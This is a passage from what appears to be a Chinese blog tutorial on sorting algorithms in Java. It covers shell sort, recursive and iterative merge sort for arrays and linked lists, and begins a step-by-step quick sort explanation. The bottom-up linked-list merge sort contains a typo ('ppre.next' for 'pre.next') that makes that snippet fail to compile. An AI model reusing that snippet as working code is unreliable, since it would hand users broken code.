class="keyword">int</span> length = arr.length;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> step = length / <span class="number">2</span>; step &gt;= <span class="number">1</span>; step /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = step; i &lt; length; i++) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            <span class="keyword">int</span> j = i - step;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp) &#123;</span><br><span class="line">                arr[j + step] = arr[j];</span><br><span class="line">                j -= step;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[j + step] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5. 归并排序"></a>5. 归并排序</h1><p>归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分</strong>(divide)成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><p><strong>分而治之</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/51-452283750.png" alt="img" style="zoom: 33%;" /></p><p> 　可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。<strong>分</strong>阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。</p><p><strong>合并相邻有序子序列</strong></p><p>　　再来看看<strong>治</strong>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/61-468169540.png" alt="img" style="zoom: 33%;" /></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/08-588010220.png" alt="img" style="zoom:33%;" /></p><p><strong>代码实现</strong></p><ol><li><p>自顶向下的归并排序（递归实现）：</p><p>1.1 数组</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sortdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by chengxiao on 2016/12/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []arr = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> []arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []temp = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];<span class="comment">//在排序前，先建好一个长度等于原数组长度的临时数组，避免递归中频繁开辟空间</span></span><br><span class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> []temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">            sort(arr,left,mid,temp);<span class="comment">//左边归并排序，使得左子序列有序</span></span><br><span class="line">            sort(arr,mid+<span class="number">1</span>,right,temp);<span class="comment">//右边归并排序，使得右子序列有序</span></span><br><span class="line">            merge(arr,left,mid,right,temp);<span class="comment">//将两个有序子数组合并操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> left,<span class="keyword">int</span> mid,<span class="keyword">int</span> right,<span class="keyword">int</span>[] temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = left;<span class="comment">//左序列指针</span></span><br><span class="line">        <span class="keyword">int</span> j = mid+<span class="number">1</span>;<span class="comment">//右序列指针</span></span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;<span class="comment">//临时数组指针</span></span><br><span class="line">        <span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]&lt;=arr[j])&#123;</span><br><span class="line">                temp[t++] = arr[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                temp[t++] = arr[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid)&#123;<span class="comment">//将左边剩余元素填充进temp中</span></span><br><span class="line">            temp[t++] = arr[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;=right)&#123;<span class="comment">//将右序列剩余元素填充进temp中</span></span><br><span class="line">            temp[t++] = arr[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        t = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//将temp中的元素全部拷贝到原数组中</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            arr[left++] = temp[t++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.2 链表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//分</span></span><br><span class="line">        <span class="comment">//找到中点</span></span><br><span class="line">        ListNode fast = head, slow = head;</span><br><span class="line">        <span class="comment">//slow的前驱结点，用于断链</span></span><br><span class="line">        ListNode preSlow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            preSlow = slow;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast != <span class="keyword">null</span>)&#123;</span><br><span class="line">            preSlow = slow;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        preSlow.next = <span class="keyword">null</span>;</span><br><span class="line">        ListNode left = sortList(head);</span><br><span class="line">        ListNode right = sortList(slow);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//治</span></span><br><span class="line">        <span class="comment">//两个有序链表合并，建立前驱结点排序</span></span><br><span class="line">        ListNode node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode res = node;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="keyword">null</span> &amp;&amp; right != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left.val &lt;= right.val)&#123;</span><br><span class="line">                node.next = left;</span><br><span class="line">                left = left.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                node.next = right;</span><br><span class="line">                right = right.next;</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        node.next = left == <span class="keyword">null</span> ? right : left;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>自底向上的归并排序（迭代实现）：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自底向上归并排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T extends Comparable&lt;? <span class="keyword">super</span> T&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">MergeSortDownToUp</span><span class="params">(T[] A)</span></span>&#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    T[] aux = (T[])Array.newInstance(A.getClass().getComponentType(), A.length);</span><br><span class="line">    <span class="keyword">int</span> len,i,j,k,start,mid,end;</span><br><span class="line">    <span class="comment">//len表示归并子数组的长度，1表示，一个一个的归并，归并后的长度为2,2表示两个两个的归并，归并后的长度为4,以此类推</span></span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">1</span>; len &lt; A.length; len = <span class="number">2</span>*len)&#123;</span><br><span class="line">        <span class="comment">//复制到辅助数组中</span></span><br><span class="line">        System.arraycopy(A, <span class="number">0</span>, aux, <span class="number">0</span>, A.length);</span><br><span class="line">        <span class="comment">//按照len的长度归并回A数组，归并后长度翻倍</span></span><br><span class="line">        <span class="keyword">for</span>(start = <span class="number">0</span>; start &lt; A.length; start = start+<span class="number">2</span>*len)&#123;</span><br><span class="line">            mid = start + len - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//对于数组长度不满足2的x次幂的数组，mid可能会大于end</span></span><br><span class="line">            end = Math.min(start + <span class="number">2</span>*len - <span class="number">1</span>, A.length-<span class="number">1</span>);</span><br><span class="line">            i = start; </span><br><span class="line">            <span class="comment">//mid大于end时,j必然大于end,所以不会引起越界访问</span></span><br><span class="line">            j = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//[start,mid] [mid+1, end]</span></span><br><span class="line">            <span class="keyword">for</span>(k = start; k &lt;= end; k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i &gt; mid)&#123;</span><br><span class="line">                    A[k] = aux[j++];</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt; end)&#123;</span><br><span class="line">                    A[k] = aux[i++];</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(aux[i].compareTo(aux[j]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    A[k] = aux[i++];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    A[k] = aux[j++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.2 链表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//初始化变量</span></span><br><span class="line">        ListNode h,h1,h2,res,pre;</span><br><span class="line">        h = head;</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">0</span>,step = <span class="number">1</span>;</span><br><span class="line">        res = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        res.next = head;</span><br><span class="line">        <span class="keyword">while</span>(h != <span class="keyword">null</span>)&#123;</span><br><span class="line">            length++;</span><br><span class="line">            h = h.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//迭代合并</span></span><br><span class="line">        <span class="keyword">while</span> (step &lt; length) &#123;</span><br><span class="line">            pre = res;</span><br><span class="line">            h = res.next;</span><br><span class="line">            <span class="keyword">while</span>(h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                h1 = h;</span><br><span class="line">                <span class="keyword">int</span> i = step;</span><br><span class="line">                <span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    h = h.next;</span><br><span class="line">                    i--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//此时不足one step</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                h2 = h;</span><br><span class="line">                i = step;</span><br><span class="line">                <span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    h = h.next;</span><br><span class="line">                    i--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//合并两组中前一组长度step，后一组step-i</span></span><br><span class="line">                <span class="keyword">int</span> len1 = step,len2 = step - i;</span><br><span class="line">                <span class="comment">//开始合并,有序链表合并</span></span><br><span class="line">                <span class="keyword">while</span>(len1 &gt; <span class="number">0</span> &amp;&amp; len2 &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(h1.val &lt;= h2.val)&#123;</span><br><span class="line">                        len1--;</span><br><span class="line">                        pre.next = h1;</span><br><span class="line">                        h1 = h1.next;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        len2--;</span><br><span class="line">                        pre.next = h2;</span><br><span class="line">                        h2 = h2.next;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pre = pre.next;</span><br><span class="line">                &#125;</span><br><span class="line">                ppre.next = len1 == <span class="number">0</span> ? h2 : h1;</span><br><span class="line">                <span class="keyword">while</span>(len1 &gt; <span class="number">0</span> || len2 &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    pre = pre.next;</span><br><span class="line">                    len1--;</span><br><span class="line">                    len2--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//把当前合并链表尾节点和下一个待合并链表头节点连接</span></span><br><span class="line">                pre.next = h;</span><br><span class="line">                </span><br><span class="line">            &#125;    </span><br><span class="line">            step *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>对两种方法的思考:</strong></p><p>图解上看，迭代方法好像是跳过了递归的划分过程直接进行合并简化了，但是划分的意义在于怎么划分的就怎么合并，如果直接合并的话，比如两两合并，出现奇数就要特殊处理，四四合并出现不足四的数也要特殊处理，这是在弥补没有划分的坑。</p><p><strong>最后</strong></p><p>　　归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。</p><h1 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6. 快速排序"></a>6. 快速排序</h1><p><a href="https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html">https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html</a></p><p>冒泡排序的时间复杂度达到了 <strong>O(N2)</strong>。假如我们的计算机每秒钟可以运行 <strong>10</strong> 亿次，那么对 <strong>1</strong> 亿个数进行排序，桶排序则只需要 <strong>0.1</strong> 秒，而冒泡排序则需要 <strong>1</strong> 千万秒，达到 <strong>115</strong> 天之久，是不是很吓人。那有没有既不浪费空间又可以快一点的排序算法呢？那就是“快速排序”啦！光听这个名字是不是就觉得很高端呢。</p><p>假设我们现在对“<strong>6 1 2 7 9 3 4 5 10 8</strong>”这个 10 个数进行排序。首先在这个序列中随便找一个数作为基准数（不要被这个名词吓到了，就是一个用来参照的数，待会你就知道它用来做啥的了）。为了方便，就让第一个数 <strong>6</strong> 作为基准数吧。接下来，需要将这个序列中所有比基准数大的数放在 <strong>6</strong> 的右边，比基准数小的数放在 <strong>6</strong> 的左边，类似下面这种排列。</p><p>3 1 2 5 4 <strong>6</strong> 9 7 10 8</p><p>在初始状态下，数字 <strong>6</strong> 在序列的第 <strong>1</strong> 位。我们的目标是将 <strong>6</strong> 挪到序列中间的某个位置，假设这个位置是 <strong>k</strong>。现在就需要寻找这个 <strong>k</strong>，并且以第 <strong>k</strong> 位为分界点，左边的数都小于等于 <strong>6</strong>，右边的数都大于等于 <strong>6</strong>。想一想，你有办法可以做到这点吗？</p><p>给你一个提示吧。请回忆一下冒泡排序，是如何通过“交换”，一步步让每个数归位的。此时你也可以通过“交换”的方法来达到目的。具体是如何一步步交换呢？怎样交换才既方便又节省时间呢？先别急着往下看，拿出笔来，在纸上画画看。我高中时第一次学习冒泡排序算法的时候，就觉得冒泡排序很浪                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              费时间，每次都只能对相邻的两个数进行比较，这显然太不合理了。于是我就想了一个办法，后来才知道原来这就是“快速排序”，请允许我小小的自恋一下(^o^)。</p><p>方法其实很简单：分别从初始序列“<strong>6 1 2 7 9 3 4 5 10 8</strong>”两端开始“探测”。先从<strong>右</strong>往<strong>左</strong>找一个小于 <strong>6</strong> 的数，再从<strong>左</strong>往<strong>右</strong>找一个大于 <strong>6</strong> 的数，然后交换他们。这里可以用两个变量 <strong>i</strong> 和 <strong>j</strong>，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵 i”和“哨兵 j”。刚开始的时候让哨兵 i 指向序列的最左边（即 <strong>i=1</strong>），指向数字 <strong>6</strong>。让哨兵 <strong>j</strong> 指向序列的最右边（即 <strong>j=10</strong>），指向数字 <strong>8</strong>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.1.png" alt="img"></p><p>首先哨兵 <strong>j</strong> 开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵 <strong>j</strong> 先出动，这一点非常重要（请自己想一想为什么）。哨兵 <strong>j</strong> 一步一步地向左挪动（即 <strong>j—</strong>），直到找到一个小于 <strong>6</strong> 的数停下来。接下来哨兵 <strong>i</strong> 再一步一步向右挪动（即 <strong>i++</strong>），直到找到一个数大于 <strong>6</strong> 的数停下来。最后哨兵 <strong>j</strong> 停在了数字 <strong>5</strong> 面前，哨兵 <strong>i</strong> 停在了数字 <strong>7</strong> 面前。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.2.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.3.png" alt="img"></p><p>现在交换哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 所指向的元素的值。交换之后的序列如下。</p><p>6 1 2 <strong>5</strong> 9 3 4 <strong>7</strong> 10 8</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.4.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.5.png" alt="img"></p><p>到此，第一次交换结束。接下来开始哨兵 <strong>j</strong> 继续向左挪动（再友情提醒，每次必须是哨兵 <strong>j</strong> 先出发）。他发现了 <strong>4</strong>（比基准数 <strong>6</strong> 要小，满足要求）之后停了下来。哨兵 <strong>i</strong> 也继续向右挪动的，他发现了 <strong>9</strong>（比基准数 <strong>6</strong> 要大，满足要求）之后停了下来。此时再次进行交换，交换之后的序列如下。</p><p>6 1 2 5 <strong>4</strong> 3 <strong>9</strong> 7 10 8</p><p>第二次交换结束，“探测”继续。哨兵 <strong>j</strong> 继续向左挪动，他发现了 <strong>3</strong>（比基准数 <strong>6</strong> 要小，满足要求）之后又停了下来。哨兵 <strong>i</strong> 继续向右移动，糟啦！此时哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 相遇了，哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 都走到 <strong>3</strong> 面前。说明此时“探测”结束。我们将基准数 <strong>6</strong> 和 <strong>3</strong> 进行交换。交换之后的序列如下。</p><p><strong>3</strong> 1 2 5 4 <strong>6</strong> 9 7 10 8</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.6.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.7.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.8.png" alt="img"></p><p>到此第一轮“探测”真正结束。此时以基准数 <strong>6</strong> 为分界点，<strong>6</strong> 左边的数都小于等于 <strong>6</strong>，<strong>6</strong> 右边的数都大于等于 <strong>6</strong>。回顾一下刚才的过程，其实哨兵 <strong>j</strong> 的使命就是要找小于基准数的数，而哨兵 <strong>i</strong> 的使命就是要找大于基准数的数，直到 <strong>i</strong> 和 <strong>j</strong> 碰头为止。</p><p>OK，解释完毕。现在基准数 <strong>6</strong> 已经归位，它正好处在序列的第 <strong>6</strong> 位。此时我们已经将原来的序列，以 <strong>6</strong> 为分界点拆分成了两个序列，左边的序列是“<strong>3 1 2 5 4</strong>”，右边的序列是“ <strong>9 7 10 8</strong> ”。接下来还需要分别处理这两个序列。因为 <strong>6</strong> 左边和右边的序列目前都还是很混乱的。不过不要紧，我们已经掌握了方法，接下来只要模拟刚才的方法分别处理 <strong>6</strong> 左边和右边的序列即可。现在先来处理 <strong>6</strong> 左边的序列现吧。</p><p>左边的序列是“<strong>3 1 2 5 4</strong>”。请将这个序列以 <strong>3</strong> 为基准数进行调整，使得 <strong>3</strong> 左边的数都小于等于 <strong>3</strong>，<strong>3</strong> 右边的数都大于等于 <strong>3</strong>。好了开始动笔吧。</p><p>如果你模拟的没有错，调整完毕之后的序列的顺序应该是。</p><p>2 1 <strong>3</strong> 5 4</p><p>OK，现在 <strong>3</strong> 已经归位。接下来需要处理 <strong>3</strong> 左边的序列“ <strong>2 1</strong> ”和右边的序列“<strong>5 4</strong>”。对序列“ <strong>2 1</strong> ”以 <strong>2</strong> 为基准数进行调整，处理完毕之后的序列为“<strong>1 2</strong>”，到此 <strong>2</strong> 已经归位。序列“<strong>1</strong>”只有一个数，也不需要进行任何处理。至此我们对序列“ <strong>2 1</strong> ”已全部处理完毕，得到序列是“<strong>1 2</strong>”。序列“<strong>5 4</strong>”的处理也仿照此方法，最后得到的序列如下。</p><p>1 2 3 4 5 6 9 7 10 8</p><p>对于序列“<strong>9 7 10 8</strong>”也模拟刚才的过程，直到不可拆分出新的子序列为止。最终将会得到这样的序列，如下。</p><p>1 2 3 4 5 6 7 8 9 10</p><p>到此，排序完全结束。细心的同学可能已经发现，快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了。下面上个霸气的图来描述下整个算法的处理过程。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.9.png" alt="img" style="zoom: 67%;" 